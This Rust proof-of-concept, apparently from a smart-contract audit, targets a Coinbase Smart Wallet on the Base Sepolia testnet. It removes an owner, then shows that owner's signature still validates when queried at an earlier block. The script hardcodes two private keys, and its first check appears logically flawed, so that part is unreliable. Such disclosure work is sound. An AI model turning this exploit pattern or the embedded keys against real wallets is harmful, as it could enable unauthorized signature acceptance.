// pub use coinbase_smart_wallet_factory::*;
use ethers::{abi::{encode, Token}, prelude::*};
use std::{convert::TryFrom, sync::Arc};

use rust::bindings::coinbase_smart_wallet::CoinbaseSmartWallet;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // prepare
    let provider = Provider::<Http>::try_from("https://sepolia.base.org")?;
    let owner0: LocalWallet = "45658215d9a309352ce6b16d3678342b3a666c7cca8117dfc4da171d5cfd7853"
        .parse::<LocalWallet>()?
        .with_chain_id(Chain::BaseSepolia);
    let owner1: LocalWallet = "e78a8647d29fb31676d46e499efe79866565edf60dde77bd77f9fbbe0920710a"
        .parse::<LocalWallet>()?
        .with_chain_id(Chain::BaseSepolia);
    let client = Arc::new(SignerMiddleware::new(provider.clone(), owner0.clone()));
    let smart_wallet_address: Address = "0x2f84acc18877f2a69e864e572c810816bd4fdb64".parse()?;
    let smart_wallet = CoinbaseSmartWallet::new(smart_wallet_address, client.clone());

    let block_number = client.get_block_number().await.unwrap();
    
    let tx = smart_wallet.remove_owner_at_index(1.into());
    let pending_tx = tx.send().await.unwrap();
    let _ = pending_tx.await.unwrap();
    println!("owner1 removed");

    let hash: [u8; 32] = H256::random().into();
    let replay_safe_hash = smart_wallet.replay_safe_hash(hash).call().await.unwrap();
    let signature1 = owner1.sign_hash(replay_safe_hash.into()).unwrap();
    let res = smart_wallet
        .is_valid_signature(
            replay_safe_hash,
            encode(&[Token::Tuple(vec![
                Token::Uint(1.into()),  
                Token::Bytes(signature1.to_vec()),
            ])])
            .into(),
        )
        .call()
        .await
        .unwrap();
    
    assert_ne!(res, [0x16, 0x26, 0xba, 0x7e]);
    println!("Verification no longer works after owner is remove");

    let res = smart_wallet
        .is_valid_signature(
            hash,
            encode(&[Token::Tuple(vec![
                Token::Uint(1.into()),  
                Token::Bytes(signature1.to_vec()),
            ])]) 
            .into(),
        )
        .block(block_number)
        .call()
        .await
        .unwrap();
    assert_eq!(res, [0x16, 0x26, 0xba, 0x7e], "owner1's signature should be valid after time travel");
    println!("time travel!!!");
    
    Ok(())
}
